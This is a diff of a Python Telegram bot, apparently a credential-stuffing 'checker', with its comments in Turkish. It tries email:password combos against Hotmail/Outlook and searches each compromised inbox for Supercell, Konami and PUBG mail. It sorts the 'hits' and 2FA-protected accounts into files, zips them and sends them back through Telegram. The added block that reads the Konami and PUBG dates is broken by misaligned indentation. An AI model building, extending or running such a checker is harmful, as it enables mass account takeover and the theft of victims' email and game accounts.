@@ -1,10 +1,9 @@
-import sys, os, re, json, time, random, threading, requests
+import sys, os, re, json, time, random, threading, requests, zipfile
 from urllib.parse import urlparse, parse_qs
 import urllib3
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 from email.utils import parsedate_to_datetime
-from datetime import datetime
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -14,9 +13,12 @@ THREAD_COUNT = 1
 multi_bekleyen = {}
 tarama_durdur = {}
 
-HITS_FILE = "checkerbothits.txt"
-SUPERCELL_HITS_FILE = "supercellcheckerbothits.txt"
+HITS_FILE = "hotmailbothits.txt"
+SUPERCELL_HITS_FILE = "supercellbothits.txt"
+KONAMI_HITS_FILE = "konamibothits.txt"
+PUBG_HITS_FILE = "pubgbothits.txt"
 TWOFA_FILE = "checkerbot2FA.txt"
+ZIP_FILE = "hotmailsupercellchecker.zip"
 
 def sarhosoldumbugun(proxy):
     if not proxy:
@@ -238,8 +240,8 @@ class marazali:
         except:
             return False
 
-    def search_supercell_messages(self, tag, token):
-        """Supercell mesajlarını say ve son tarihi bul"""
+    def search_messages(self, tag, query, token):
+        """Belirli bir kelime için mesaj sayısı ve son tarihi bul"""
         try:
             url = "https://outlook.live.com/search/api/v2/query"
             params = {"n": "124", "cv": "tNZ1DVP5NhDwG%2FDUCelaIu.124"}
@@ -256,7 +258,7 @@ class marazali:
                         {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                     ]},
                     "From": 0,
-                    "Query": {"QueryString": "Supercell"},
+                    "Query": {"QueryString": query},
                     "RefiningQueries": None,
                     "Size": 500,
                     "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
@@ -264,7 +266,7 @@ class marazali:
                     "TopResultsCount": 3
                 }],
                 "AnswerEntityRequests": [{
-                    "Query": {"QueryString": "Supercell"},
+                    "Query": {"QueryString": query},
                     "EntityTypes": ["Event", "File"],
                     "From": 0,
                     "Size": 10,
@@ -293,17 +295,14 @@ class marazali:
                 total = 0
                 son_tarih = None
                 
-                # Toplam mesaj sayısını bul
                 for es in data.get("EntitySets", []):
                     if es.get("Total") is not None:
                         total = es.get("Total", 0)
                         break
                 
-                # Son mesaj tarihini bul
                 for es in data.get("EntitySets", []):
                     results = es.get("Results", [])
                     if results:
-                        # İlk sonuç en güncel olan
                         first_result = results[0]
                         date_str = first_result.get("DateTimeReceived") or first_result.get("DateTimeLastModified")
                         if date_str:
@@ -314,7 +313,6 @@ class marazali:
                         break
                 
                 if total == 0:
-                    # Alternatif: regex ile ara
                     total_match = re.search(r'"Total":\s*(\d+)', r.text)
                     if total_match:
                         total = int(total_match.group(1))
@@ -336,17 +334,33 @@ class marazali:
         
         time.sleep(2)
         
-        # Supercell mesajlarını say
-        mesaj_sayisi, son_tarih = self.search_supercell_messages(tag, token)
+        # Supercell mesajları
+        sc_sayisi, sc_tarih = self.search_messages(tag, "Supercell", token)
+        time.sleep(1)
         
-        supercell_info = None
-        if mesaj_sayisi > 0:
-            supercell_info = {
-                'mesaj_sayisi': mesaj_sayisi,
-                'son_tarih': son_tarih.strftime('%Y-%m-%d %H:%M:%S') if son_tarih else 'N/A'
+        # Konami mesajları
+        konami_sayisi, konami_tarih = self.search_messages(tag, "Konami", token)
+        time.sleep(1)
+        
+        # PUBG mesajları
+        pubg_sayisi, pubg_tarih = self.search_messages(tag, "PUBG", token)
+        
+        mesaj_info = {
+            'supercell': {
+                'sayi': sc_sayisi,
+                'tarih': sc_tarih.strftime('%Y-%m-%d %H:%M:%S') if sc_tarih else 'N/A'
+            },
+            'konami': {
+                'sayi': konami_sayisi,
+                'tarih': konami_tarih.strftime('%Y-%m-%d %H:%M:%S') if konami_tarih else 'N/A'
+            },
+            'pubg': {
+                'sayi': pubg_sayisi,
+                'tarih': pubg_tarih.strftime('%Y-%m-%d %H:%M:%S') if pubg_tarih else 'N/A'
             }
+        }
         
-        return "SUCCESS", supercell_info
+        return "SUCCESS", mesaj_info
 
 def send_message(chat_id, text, reply_markup=None):
     try:
@@ -379,6 +393,17 @@ def download_file(file_id):
     except:
         return None
 
+def create_zip():
+    """Tüm hit dosyalarını zip'le"""
+    try:
+        with zipfile.ZipFile(ZIP_FILE, 'w', zipfile.ZIP_DEFLATED) as zf:
+            for f in [HITS_FILE, SUPERCELL_HITS_FILE, KONAMI_HITS_FILE, PUBG_HITS_FILE, TWOFA_FILE]:
+                if os.path.exists(f) and os.path.getsize(f) > 0:
+                    zf.write(f, os.path.basename(f))
+        return True
+    except:
+        return False
+
 def ana_menu(chat_id):
     keyboard = {
         "inline_keyboard": [
@@ -388,7 +413,7 @@ def ana_menu(chat_id):
             [{"text": "📊 Durum", "callback_data": "durum"}]
         ]
     }
-    send_message(chat_id, "🤖 <b>Supercell Mesaj Checker Bot</b>\n\nSeçenek seç:", keyboard)
+    send_message(chat_id, "🤖 <b>Hotmail Multi-Game Checker Bot</b>\n\nSupercell + Konami + PUBG mesaj kontrolü\n\nSeçenek seç:", keyboard)
 
 def thread_menu(chat_id):
     global THREAD_COUNT
@@ -405,19 +430,16 @@ def thread_menu(chat_id):
     send_message(chat_id, f"⚡ <b>Thread Ayarları</b>\n\nŞu anki: {THREAD_COUNT} Thread\n\nSeçim yap:", keyboard)
 
 def benferooolum():
-    with open(HITS_FILE, 'w', encoding='utf-8') as fh:
-        pass
-    with open(SUPERCELL_HITS_FILE, 'w', encoding='utf-8') as fh:
-        pass
-    with open(TWOFA_FILE, 'w', encoding='utf-8') as fh:
-        pass
+    for f in [HITS_FILE, SUPERCELL_HITS_FILE, KONAMI_HITS_FILE, PUBG_HITS_FILE, TWOFA_FILE]:
+        with open(f, 'w', encoding='utf-8') as fh:
+            pass
 
 def tarama_yap(chat_id, accounts, dosya_adi):
     global THREAD_COUNT
     benferooolum()
     dogrudogru = len(accounts)
     babasarkikalmadi = time.time()
-    egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0, "supercell_hits": 0}
+    egriegri = {"checked": 0, "hit": 0, "bad": 0, "twofa": 0, "errors": 0, "supercell_hits": 0, "konami_hits": 0, "pubg_hits": 0}
     lock = threading.Lock()
     semaphore = threading.BoundedSemaphore(THREAD_COUNT)
     tarama_durdur[chat_id] = False
@@ -435,27 +457,51 @@ def tarama_yap(chat_id, accounts, dosya_adi):
             email, password = combo.split(":", 1)
             tag = email.split("@")[0][:12]
             c = marazali(email, password, None)
-            status, supercell_info = c.check(tag)
+            status, mesaj_info = c.check(tag)
             with lock:
                 if status == "SUCCESS":
                     egriegri["hit"] += 1
-                    if supercell_info:
+                    
+                    sc_sayi = mesaj_info.get('supercell', {}).get('sayi', 0) if mesaj_info else 0
+                    konami_sayi = mesaj_info.get('konami', {}).get('sayi', 0) if mesaj_info else 0
+                    pubg_sayi = mesaj_info.get('pubg', {}).get('sayi', 0) if mesaj_info else 0
+                    
+                    sc_tarih = mesaj_info.get('supercell', {}).get('tarih', 'N/A') if mesaj_info else 'N/A'
+    konami_tarih = mesaj_info.get('konami', {}).get('tarih', 'N/A') if mesaj_info else 'N/A'
+                       pubg_tarih = mesaj_info.get('pubg', {}).get('tarih', 'N/A') if mesaj_info else 'N/A'
+                    
+                    # Normal hit - her zaman yaz
+                    normal_hit = f"{combo}"
+                    with open(HITS_FILE, 'a', encoding='utf-8') as f:
+                        f.write(normal_hit + "\n")
+                    
+                    # Supercell hit
+                    if sc_sayi > 0:
                         egriegri["supercell_hits"] += 1
-                        mesaj_sayisi = supercell_info.get('mesaj_sayisi', 0)
-                        son_tarih = supercell_info.get('son_tarih', 'N/A')
-                        
-                        esrefftek = f"{combo} | Supercell Mesaj: {mesaj_sayisi} | Son Mesaj: {son_tarih}"
-                        
+                        sc_line = f"{combo} | Supercell Mesaj: {sc_sayi} | Son Mesaj: {sc_tarih}"
                         with open(SUPERCELL_HITS_FILE, 'a', encoding='utf-8') as f:
-                            f.write(esrefftek + "\n")
-                        with open(HITS_FILE, 'a', encoding='utf-8') as f:
-                            f.write(esrefftek + "\n")
-                        print(f"✅ SUPERCELL {esrefftek}", flush=True)
-                    else:
-                        esrefftek = f"{combo} | Supercell Mesaj: 0"
-                        with open(HITS_FILE, 'a', encoding='utf-8') as f:
-                            f.write(esrefftek + "\n")
-                        print(f"✅ HİT {esrefftek}", flush=True)
+                            f.write(sc_line + "\n")
+                        print(f"✅ SUPERCELL {sc_line}", flush=True)
+                    
+                    # Konami hit
+                    if konami_sayi > 0:
+                        egriegri["konami_hits"] += 1
+                        konami_line = f"{combo} | Konami Mesaj: {konami_sayi} | Son Mesaj: {konami_tarih}"
+                        with open(KONAMI_HITS_FILE, 'a', encoding='utf-8') as f:
+                            f.write(konami_line + "\n")
+                        print(f"✅ KONAMI {konami_line}", flush=True)
+                    
+                    # PUBG hit
+                    if pubg_sayi > 0:
+                        egriegri["pubg_hits"] += 1
+                        pubg_line = f"{combo} | PUBG Mesaj: {pubg_sayi} | Son Mesaj: {pubg_tarih}"
+                        with open(PUBG_HITS_FILE, 'a', encoding='utf-8') as f:
+                            f.write(pubg_line + "\n")
+                        print(f"✅ PUBG {pubg_line}", flush=True)
+                    
+                    if sc_sayi == 0 and konami_sayi == 0 and pubg_sayi == 0:
+                        print(f"✅ HİT {combo} | Oyun mesajı yok", flush=True)
+                
                 elif status == "2FA":
                     egriegri["twofa"] += 1
                     with open(TWOFA_FILE, 'a', encoding='utf-8') as f:
@@ -483,6 +529,8 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                 checked = egriegri["checked"]
                 hit = egriegri["hit"]
                 sc = egriegri["supercell_hits"]
+                konami = egriegri["konami_hits"]
+                pubg = egriegri["pubg_hits"]
                 twofa = egriegri["twofa"]
                 bad = egriegri["bad"]
                 errors = egriegri["errors"]
@@ -499,7 +547,9 @@ def tarama_yap(chat_id, accounts, dosya_adi):
                 f"📊 İlerleme: {checked}/{total} (%{yuzde:.1f})\n"
                 f"{bar}\n\n"
                 f"✅ HIT: {hit}\n"
-                f"📩 SUPERCELL MESAJLI: {sc}\n"
+                f"🎮 SUPERCELL: {sc}\n"
+                f"🕹️ KONAMI: {konami}\n"
+                f"🔫 PUBG: {pubg}\n"
                 f"🔐 2FA: {twofa}\n"
                 f"❌ BAD: {bad}\n"
                 f"⚠️ HATA: {errors}\n\n"
@@ -531,22 +581,36 @@ def tarama_yap(chat_id, accounts, dosya_adi):
 
     elapsed = time.time() - babasarkikalmadi
     durdu = tarama_durdur.get(chat_id, False)
+    
+    # ZIP oluştur
+    zip_olustu = create_zip()
+    
     stats = (
         f"{'⏹️ Tarama durduruldu' if durdu else '✅ Tarama tamamlandı'} ({elapsed:.1f} sn)\n\n"
         f"🔱 Toplam: {dogrudogru}\n"
         f"✅ Hit: {egriegri['hit']}\n"
-        f"📩 Supercell Mesajlı: {egriegri['supercell_hits']}\n"
+        f"🎮 Supercell: {egriegri['supercell_hits']}\n"
+        f"🕹️ Konami: {egriegri['konami_hits']}\n"
+        f"🔫 PUBG: {egriegri['pubg_hits']}\n"
         f"❌ Bad: {egriegri['bad']}\n"
         f"🔐 2FA: {egriegri['twofa']}\n"
         f"⚠️ Hata: {egriegri['errors']}"
     )
     send_message(chat_id, stats)
-    if os.path.exists(HITS_FILE) and os.path.getsize(HITS_FILE) > 0:
-        send_document(chat_id, HITS_FILE)
-    if os.path.exists(SUPERCELL_HITS_FILE) and os.path.getsize(SUPERCELL_HITS_FILE) > 0:
-        send_document(chat_id, SUPERCELL_HITS_FILE)
-    if os.path.exists(TWOFA_FILE) and os.path.getsize(TWOFA_FILE) > 0:
-        send_document(chat_id, TWOFA_FILE)
+    
+    # ZIP dosyasını gönder
+    if zip_olustu:
+        send_document(chat_id, ZIP_FILE)
+    else:
+        # ZIP olmadıysa ayrı ayrı gönder
+        if os.path.exists(HITS_FILE) and os.path.getsize(HITS_FILE) > 0:
+            send_document(chat_id, HITS_FILE)
+        if os.path.exists(SUPERCELL_HITS_FILE) and os.path.getsize(SUPERCELL_HITS_FILE) > 0:
+            send_document(chat_id, SUPERCELL_HITS_FILE)
+        if os.path.exists(KONAMI_HITS_FILE) and os.path.getsize(KONAMI_HITS_FILE) > 0:
+            send_document(chat_id, KONAMI_HITS_FILE)
+        if os.path.exists(PUBG_HITS_FILE) and os.path.getsize(PUBG_HITS_FILE) > 0:
+            send_document(chat_id, PUBG_HITS_FILE)
 
 def telegram_bot():
     global offset, THREAD_COUNT
